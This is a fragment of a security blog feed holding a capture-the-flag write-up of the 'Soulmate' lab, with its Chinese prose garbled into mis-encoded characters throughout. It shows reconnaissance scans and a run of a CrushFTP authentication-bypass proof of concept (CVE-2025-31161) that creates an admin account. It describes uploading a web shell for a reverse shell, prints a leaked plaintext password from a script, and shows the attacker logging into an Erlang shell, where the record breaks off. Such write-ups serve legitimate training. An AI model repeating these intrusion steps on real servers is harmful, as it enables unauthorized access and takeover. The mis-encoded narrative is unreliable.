class="hljs-number">2</span>è·å–<span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure><p>ä¿®å¤æ–‡ä»¶ä¹‹åï¼Œåˆ é™¤å®ˆæŠ¤æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/36bbbd449ecc0bd8.png"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;<span class="hljs-number">081</span>ce<span class="hljs-number">3688</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>cd<span class="hljs-number">6e2946125081381087</span><span class="hljs-keyword">c</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åº”æ€¥å“åº”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Soulmate</title>
    <link href="/2025/09/14/HTB-Soulmate/"/>
    <url>/2025/09/14/HTB-Soulmate/</url>
    
    <content type="html"><![CDATA[<p>éš¾åº¦ï¼šeasyï¼Œæ²¡å•¥æ„æ€ã€‚æ–‡ä»¶ä¸Šä¼ æ‹¿ shellï¼Œå†åˆ©ç”¨ Erlang åŠ è½½çš„ OS æ¨¡å—å‘½ä»¤æ‰§è¡Œ</p><span id="more"></span><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€# nmap -sS -sV -A -Pn 10.10.11.86<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 19:47 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.86<br>Host is up (0.23s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)<br>|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)<br>80/tcp open  http    nginx 1.18.0 (Ubuntu)<br>|_http-title: Did not follow redirect to http://soulmate.htb/<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.94SVN%E=4%D=9/14%OT=22%CT=1%CU=42823%PV=Y%DS=3%DC=T%G=Y%TM=68C6<br>OS:AB7A%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10F%TI=Z%CI=Z)SEQ(SP=100<br>OS:%GCD=1%ISR=10F%TI=Z%CI=Z%TS=A)SEQ(SP=100%GCD=1%ISR=10F%TI=Z%CI=Z%II=I)SE<br>OS:Q(SP=100%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M542ST11NW7%O2=M542ST1<br>OS:1NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542ST11NW7%O6=M542ST11)WIN(W1=FE<br>OS:88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5<br>OS:42NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4<br>OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%<br>OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=<br>OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=F279%RUD=G)IE(R=Y%DFI<br>OS:=N%T=40%CD=S)<br><br>Network Distance: 3 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/db25d3c66d73e2fe.png"></p><h2 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â””â”€# ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">110000</span>.txt -u http://soulmate.htb/ -H &quot;Host:FUZZ.soulmate.htb&quot; -fw <span class="hljs-number">4</span><br><br>        /&#x27;___\  /&#x27;___\           /&#x27;___\<br>       /\ \__/ /\ \__/  __  __  /\ \__/<br>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\<br>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/<br>         \ \_\   \ \_\  \ \____/  \ \_\<br>          \/_/    \/_/   \/___/    \/_/<br><br>       v2.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-dev<br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http://soulmate.htb/<br> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">110000</span>.txt<br> :: Header           : Host: FUZZ.soulmate.htb<br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Timeout          : <span class="hljs-number">10</span><br> :: Threads          : <span class="hljs-number">40</span><br> :: Matcher          : Response status: <span class="hljs-number">200</span>-<span class="hljs-number">299</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>,<span class="hljs-number">500</span><br> :: Filter           : Response words: <span class="hljs-number">4</span><br>________________________________________________<br><br>ftp                     [Status: <span class="hljs-number">302</span>, Size: <span class="hljs-number">0</span>, Words: <span class="hljs-number">1</span>, Lines: <span class="hljs-number">1</span>, Duration: <span class="hljs-number">364</span>ms]<br></code></pre></td></tr></table></figure><h1 id="CVE-2025-31161-æ–‡ä»¶ä¸Šä¼ "><a href="#CVE-2025-31161-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="CVE-2025-31161+æ–‡ä»¶ä¸Šä¼ "></a>CVE-2025-31161+æ–‡ä»¶ä¸Šä¼ </h1><p>æœ‰ä¸€ä¸ª ftp å­åŸŸå </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://ftp.soulmate.htb/WebInterface/login.html<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ebcacdf782ce05c8.png"></p><p>CrushFTPï¼Œçœ‹ç½‘é¡µæºä»£ç å¯ä»¥å‘ç°ç‰ˆæœ¬ 11.W.657ï¼Œæ‰¾åˆ°å‡ ä¸ªèº«ä»½éªŒè¯çš„ CVE</p><ul><li><a href="https://www.freebuf.com/articles/vuls/447732.html">CrushFTPèº«ä»½éªŒè¯ç»•è¿‡æ¼æ´(CVE-2025-54309)å¤ç°</a></li><li><a href="https://github.com/Immersive-Labs-Sec/CVE-2025-31161">Proof of Concept for CVE-2025-31161 &#x2F; CVE-2025-2825</a></li></ul><p>CVE-2025-31161 å¯ä»¥ç”¨</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">This POC will exploit the authbypass vulnerability to create a new user account with Admin level permissions. The Auth Bypass requires the username (target<span class="hljs-emphasis">_user) of an existing user on the CrushFTP server. The default is set to crushadmin</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œ poc </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â””â”€# python poc.py --target_host ftp.soulmate.htb --port <span class="hljs-number">80</span> --target_user root --new_user butt3rf1y --password adminadmin<br>[+] Preparing Payloads<br>  [-] Warming up the target<br>  [-] Target is up and running<br>[+] Sending Account Create Request<br>  [!] User created successfully<br>[+] Exploit Complete you can now login with<br>   [*] Username: butt3rf1y<br>   [*] Password: adminadmin.<br></code></pre></td></tr></table></figure><p>åœ¨ User Manage æ¨¡å—å‘ç°æœ‰å‡ ä¸ªç”¨æˆ·</p><p><img src="https://img.dkdun.cn/v1/2025/12/0704ad04d37f5c13.png"></p><p>å¯ä»¥ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼Œå…ˆæ”¹ ben çš„ï¼Œç™»å½•è¿›å»å‘ç°èƒ½è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šé©¬ï¼Œé©¬åœ¨ä¸€æ®µæ—¶é—´åä¼šè¢«åˆ é™¤ï¼Œæ‰€ä»¥æƒé™ç»´æŒåŠ¨ä½œéœ€è¦å¿«ç‚¹</p><p><img src="https://img.dkdun.cn/v1/2025/12/795b09dc4713527b.png"></p><p>åå¼¹ shellï¼Œåœ¨ <code>/usr/local/lib/erlang_login</code> çš„ç›®å½•ä¸‹æ‰¾åˆ° start.escript </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs javascript">#!<span class="hljs-regexp">/usr/</span>bin/env escript<br>%%! -sname ssh_runner<br><br><span class="hljs-title function_">main</span>(_) -&gt;<br>    <span class="hljs-attr">application</span>:<span class="hljs-title function_">start</span>(asn1),<br>    <span class="hljs-attr">application</span>:<span class="hljs-title function_">start</span>(crypto),<br>    <span class="hljs-attr">application</span>:<span class="hljs-title function_">start</span>(public_key),<br>    <span class="hljs-attr">application</span>:<span class="hljs-title function_">start</span>(ssh),<br><br>    <span class="hljs-attr">io</span>:<span class="hljs-title function_">format</span>(<span class="hljs-string">&quot;Starting SSH daemon with logging...~n&quot;</span>),<br><br>    <span class="hljs-keyword">case</span> <span class="hljs-attr">ssh</span>:<span class="hljs-title function_">daemon</span>(<span class="hljs-number">2222</span>, [<br>        &#123;ip, &#123;<span class="hljs-number">127</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125;&#125;,<br>        &#123;system_dir, <span class="hljs-string">&quot;/etc/ssh&quot;</span>&#125;,<br><br>        &#123;user_dir_fun, <span class="hljs-title function_">fun</span>(<span class="hljs-title class_">User</span>) -&gt;<br>            <span class="hljs-title class_">Dir</span> = <span class="hljs-attr">filename</span>:<span class="hljs-title function_">join</span>(<span class="hljs-string">&quot;/home&quot;</span>, <span class="hljs-title class_">User</span>),<br>            <span class="hljs-attr">io</span>:<span class="hljs-title function_">format</span>(<span class="hljs-string">&quot;Resolving user_dir for ~p: ~s/.ssh~n&quot;</span>, [<span class="hljs-title class_">User</span>, <span class="hljs-title class_">Dir</span>]),<br>            <span class="hljs-attr">filename</span>:<span class="hljs-title function_">join</span>(<span class="hljs-title class_">Dir</span>, <span class="hljs-string">&quot;.ssh&quot;</span>)<br>        end&#125;,<br><br>        &#123;connectfun, <span class="hljs-title function_">fun</span>(<span class="hljs-title class_">User</span>, <span class="hljs-title class_">PeerAddr</span>, <span class="hljs-title class_">Method</span>) -&gt;<br>            <span class="hljs-attr">io</span>:<span class="hljs-title function_">format</span>(<span class="hljs-string">&quot;Auth success for user: ~p from ~p via ~p~n&quot;</span>,<br>                      [<span class="hljs-title class_">User</span>, <span class="hljs-title class_">PeerAddr</span>, <span class="hljs-title class_">Method</span>]),<br>            <span class="hljs-literal">true</span><br>        end&#125;,<br><br>        &#123;failfun, <span class="hljs-title function_">fun</span>(<span class="hljs-title class_">User</span>, <span class="hljs-title class_">PeerAddr</span>, <span class="hljs-title class_">Reason</span>) -&gt;<br>            <span class="hljs-attr">io</span>:<span class="hljs-title function_">format</span>(<span class="hljs-string">&quot;Auth failed for user: ~p from ~p, reason: ~p~n&quot;</span>,<br>                      [<span class="hljs-title class_">User</span>, <span class="hljs-title class_">PeerAddr</span>, <span class="hljs-title class_">Reason</span>]),<br>            <span class="hljs-literal">true</span><br>        end&#125;,<br><br>        &#123;auth_methods, <span class="hljs-string">&quot;publickey,password&quot;</span>&#125;,<br><br>        &#123;user_passwords, [&#123;<span class="hljs-string">&quot;ben&quot;</span>, <span class="hljs-string">&quot;HouseH0ldings998&quot;</span>&#125;]&#125;,<br>        &#123;idle_time, infinity&#125;,<br>        &#123;max_channels, <span class="hljs-number">10</span>&#125;,<br>        &#123;max_sessions, <span class="hljs-number">10</span>&#125;,<br>        &#123;parallel_login, <span class="hljs-literal">true</span>&#125;<br>    ]) <span class="hljs-keyword">of</span><br>        &#123;ok, _Pid&#125; -&gt;<br>            <span class="hljs-attr">io</span>:<span class="hljs-title function_">format</span>(<span class="hljs-string">&quot;SSH daemon running on port 2222. Press Ctrl+C to exit.~n&quot;</span>);<br>        &#123;error, <span class="hljs-title class_">Reason</span>&#125; -&gt;<br>            <span class="hljs-attr">io</span>:<span class="hljs-title function_">format</span>(<span class="hljs-string">&quot;Failed to start SSH daemon: ~p~n&quot;</span>, [<span class="hljs-title class_">Reason</span>])<br>    end,<br><br>    receive<br>        stop -&gt; ok<br>    end.<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°ç”¨æˆ·å¯†ç ï¼Œssh ç™»å½•</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;ben&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;HouseH0ldings998&quot;</span><br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° userflag</p><h1 id="åˆ©ç”¨-Erlang-æœåŠ¡åŠ è½½çš„-os-æ¨¡å—å‘½ä»¤æ‰§è¡Œ"><a href="#åˆ©ç”¨-Erlang-æœåŠ¡åŠ è½½çš„-os-æ¨¡å—å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="åˆ©ç”¨ Erlang æœåŠ¡åŠ è½½çš„ os æ¨¡å—å‘½ä»¤æ‰§è¡Œ"></a>åˆ©ç”¨ Erlang æœåŠ¡åŠ è½½çš„ os æ¨¡å—å‘½ä»¤æ‰§è¡Œ</h1><p>æŸ¥çœ‹ç«¯å£å¼€æ”¾æƒ…å†µï¼Œå‘ç° 2222 ç«¯å£è¿è¡Œäº†åŸºäº Erlang çš„ SSH æœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ben@soulmate:~$ nc 127.0.0.1 2222<br>SSH-2.0-Erlang/5.2.9<br></code></pre></td></tr></table></figure><p>ç™»å½•æŸ¥çœ‹</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">ben@soulmate:~$ <span class="hljs-title">ssh</span> <span class="hljs-title">ben</span>@<span class="hljs-title">localhost</span> -<span class="hljs-title">p</span> 2222</span><br><span class="hljs-function"><span class="hljs-title">ben</span>@<span class="hljs-title">localhost</span>&#x27;<span class="hljs-title">s</span> <span class="hljs-title">password</span>:</span><br><span class="hljs-function"><span class="hljs-title">Eshell</span> <span class="hljs-title">V15</span>.2.5 (<span class="hljs-title">press</span> <span class="hljs-title">Ctrl</span>+<span class="hljs-title">G</span> <span class="hljs-title">to</span> <span class="hljs-title">abort</span>, <span class="hljs-title">type</span> <span class="hljs-title">help</span>(). <span class="hljs-title">for</span> <span class="hljs-title">help</span>)</span><br><span class="hljs-function">(<span class="hljs-title">ssh_runner</span>@<span class="hljs-title">soulmate</span>)1&gt; <span class="hljs-title">help</span>().</span><br><span class="hljs-function">** <span class="hljs-title">shell</span> <span class="hljs-title">internal</span> <span class="hljs-title">commands</span> **</span><br><span class="hljs-function"><span class="hljs-title">b</span>()        -- <span class="hljs-title">display</span> <span class="hljs-title">all</span> <span class="hljs-title">variable</span> <span class="hljs-title">bindings</span></span><br><span class="hljs-function"><span class="hljs-title">e</span>(<span class="hljs-title">N</span>)       -- <span class="hljs-title">repeat</span> <span class="hljs-title">the</span> <span class="hljs-title">expression</span> <span class="hljs-title">in</span> <span class="hljs-title">query</span> &lt;<span class="hljs-title">N</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">f</span>()        -- <span class="hljs-title">forget</span> <span class="hljs-title">all</span> <span class="hljs-title">variable</span> <span class="hljs-title">bindings</span></span><br><span class="hljs-function"><span class="hljs-title">f</span>(<span class="hljs-title">X</span>)       -- <span class="hljs-title">forget</span> <span class="hljs-title">the</span> <span class="hljs-title">binding</span> <span class="hljs-title">of</span> <span class="hljs-title">variable</span> <span class="hljs-title">X</span></span><br><span class="hljs-function"><span class="hljs-title">h</span>()        -- <span class="hljs-title">history</span></span><br><span class="hljs-function"><span class="hljs-title">h</span>(<span class="hljs-title">Mod</span>)     -- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">h</span>(<span class="hljs-title">Mod</span>,<span class="hljs-title">Func</span>)-- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">function</span> <span class="hljs-title">in</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">h</span>(<span class="hljs-title">Mod</span>,<span class="hljs-title">Func</span>,<span class="hljs-title">Arity</span>) -- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">function</span> <span class="hljs-title">with</span> <span class="hljs-title">arity</span> <span class="hljs-title">in</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">ht</span>(<span class="hljs-title">Mod</span>)    -- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">a</span> <span class="hljs-title">module</span>&#x27;<span class="hljs-title">s</span> <span class="hljs-title">types</span></span><br><span class="hljs-function"><span class="hljs-title">ht</span>(<span class="hljs-title">Mod</span>,<span class="hljs-title">Type</span>) -- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">type</span> <span class="hljs-title">in</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">ht</span>(<span class="hljs-title">Mod</span>,<span class="hljs-title">Type</span>,<span class="hljs-title">Arity</span>) -- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">type</span> <span class="hljs-title">with</span> <span class="hljs-title">arity</span> <span class="hljs-title">in</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">hcb</span>(<span class="hljs-title">Mod</span>)    -- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">a</span> <span class="hljs-title">module</span>&#x27;<span class="hljs-title">s</span> <span class="hljs-title">callbacks</span></span><br><span class="hljs-function"><span class="hljs-title">hcb</span>(<span class="hljs-title">Mod</span>,<span class="hljs-title">CB</span>) -- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">callback</span> <span class="hljs-title">in</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">hcb</span>(<span class="hljs-title">Mod</span>,<span class="hljs-title">CB</span>,<span class="hljs-title">Arity</span>) -- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">callback</span> <span class="hljs-title">with</span> <span class="hljs-title">arity</span> <span class="hljs-title">in</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">history</span>(<span class="hljs-title">N</span>) -- <span class="hljs-title">set</span> <span class="hljs-title">how</span> <span class="hljs-title">many</span> <span class="hljs-title">previous</span> <span class="hljs-title">commands</span> <span class="hljs-title">to</span> <span class="hljs-title">keep</span></span><br><span class="hljs-function"><span class="hljs-title">results</span>(<span class="hljs-title">N</span>) -- <span class="hljs-title">set</span> <span class="hljs-title">how</span> <span class="hljs-title">many</span> <span class="hljs-title">previous</span> <span class="hljs-title">command</span> <span class="hljs-title">results</span> <span class="hljs-title">to</span> <span class="hljs-title">keep</span></span><br><span class="hljs-function"><span class="hljs-title">catch_exception</span>(<span class="hljs-title">B</span>) -- <span class="hljs-title">how</span> <span class="hljs-title">exceptions</span> <span class="hljs-title">are</span> <span class="hljs-title">handled</span></span><br><span class="hljs-function"><span class="hljs-title">v</span>(<span class="hljs-title">N</span>)       -- <span class="hljs-title">use</span> <span class="hljs-title">the</span> <span class="hljs-title">value</span> <span class="hljs-title">of</span> <span class="hljs-title">query</span> &lt;<span class="hljs-title">N</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">rd</span>(<span class="hljs-title">R</span>,<span class="hljs-title">D</span>)    -- <span class="hljs-title">define</span> <span class="hljs-title">a</span> <span class="hljs-title">record</span></span><br><span class="hljs-function"><span class="hljs-title">rf</span>()       -- <span class="hljs-title">remove</span> <span class="hljs-title">all</span> <span class="hljs-title">record</span> <span class="hljs-title">information</span></span><br><span class="hljs-function"><span class="hljs-title">rf</span>(<span class="hljs-title">R</span>)      -- <span class="hljs-title">remove</span> <span class="hljs-title">record</span> <span class="hljs-title">information</span> <span class="hljs-title">about</span> <span class="hljs-title">R</span></span><br><span class="hljs-function"><span class="hljs-title">rl</span>()       -- <span class="hljs-title">display</span> <span class="hljs-title">all</span> <span class="hljs-title">record</span> <span class="hljs-title">information</span></span><br><span class="hljs-function"><span class="hljs-title">rl</span>(<span class="hljs-title">R</span>)      -- <span class="hljs-title">display</span> <span class="hljs-title">record</span> <span class="hljs-title">information</span> <span class="hljs-title">about</span> <span class="hljs-title">R</span></span><br><span class="hljs-function"><span class="hljs-title">rp</span>(<span class="hljs-title">Term</span>)   -- <span class="hljs-title">display</span> <span class="hljs-title">Term</span> <span class="hljs-title">using</span> <span class="hljs-title">the</span> <span class="hljs-title">shell</span>&#x27;<span class="hljs-title">s</span> <span class="hljs-title">record</span> <span class="hljs-title">information</span></span><br><span class="hljs-function"><span class="hljs-title">rr</span>(<span class="hljs-title">File</span>)   -- <span class="hljs-title">read</span> <span class="hljs-title">record</span> <span class="hljs-title">information</span> <span class="hljs-title">from</span> <span class="hljs-title">File</span> (<span class="hljs-title">wildcards</span> <span class="hljs-title">allowed</span>)</span><br><span class="hljs-function"><span class="hljs-title">rr</span>(<span class="hljs-title">F</span>,<span class="hljs-title">R</span>)    -- <span class="hljs-title">read</span> <span class="hljs-title">selected</span> <span class="hljs-title">record</span> <span class="hljs-title">information</span> <span class="hljs-title">from</span> <span class="hljs-title">file</span>(<span class="hljs-title">s</span>)</span><br><span class="hljs-function"><span class="hljs-title">rr</span>(<span class="hljs-title">F</span>,<span class="hljs-title">R</span>,<span class="hljs-title">O</span>)  -- <span class="hljs-title">read</span> <span class="hljs-title">selected</span> <span class="hljs-title">record</span> <span class="hljs-title">information</span> <span class="hljs-title">with</span> <span class="hljs-title">options</span></span><br><span class="hljs-function"><span class="hljs-title">lf</span>()       -- <span class="hljs-title">list</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">functions</span></span><br><span class="hljs-function"><span class="hljs-title">lt</span>()       -- <span class="hljs-title">list</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">types</span></span><br><span class="hljs-function"><span class="hljs-title">lr</span>()       -- <span class="hljs-title">list</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">records</span></span><br><span class="hljs-function"><span class="hljs-title">ff</span>()       -- <span class="hljs-title">forget</span> <span class="hljs-title">all</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">functions</span></span><br><span class="hljs-function"><span class="hljs-title">ff</span>(&#123;<span class="hljs-title">F</span>,<span class="hljs-title">A</span>&#125;)  -- <span class="hljs-title">forget</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">function</span> <span class="hljs-title">named</span> <span class="hljs-title">as</span> <span class="hljs-title">atom</span> <span class="hljs-title">F</span> <span class="hljs-title">and</span> <span class="hljs-title">arity</span> <span class="hljs-title">A</span></span><br><span class="hljs-function"><span class="hljs-title">tf</span>()       -- <span class="hljs-title">forget</span> <span class="hljs-title">all</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">types</span></span><br><span class="hljs-function"><span class="hljs-title">tf</span>(<span class="hljs-title">T</span>)      -- <span class="hljs-title">forget</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">type</span> <span class="hljs-title">named</span> <span class="hljs-title">as</span> <span class="hljs-title">atom</span> <span class="hljs-title">T</span></span><br><span class="hljs-function"><span class="hljs-title">fl</span>()       -- <span class="hljs-title">forget</span> <span class="hljs-title">all</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">functions</span>, <span class="hljs-title">types</span> <span class="hljs-title">and</span> <span class="hljs-title">records</span></span><br><span class="hljs-function"><span class="hljs-title">save_module</span>(<span class="hljs-title">FilePath</span>) -- <span class="hljs-title">save</span> <span class="hljs-title">all</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">functions</span>, <span class="hljs-title">types</span> <span class="hljs-title">and</span> <span class="hljs-title">records</span> <span class="hljs-title">to</span> <span class="hljs-title">a</span> <span class="hljs-title">file</span></span><br><span class="hljs-function"><span class="hljs-title">bt</span>(<span class="hljs-title">Pid</span>)    -- <span 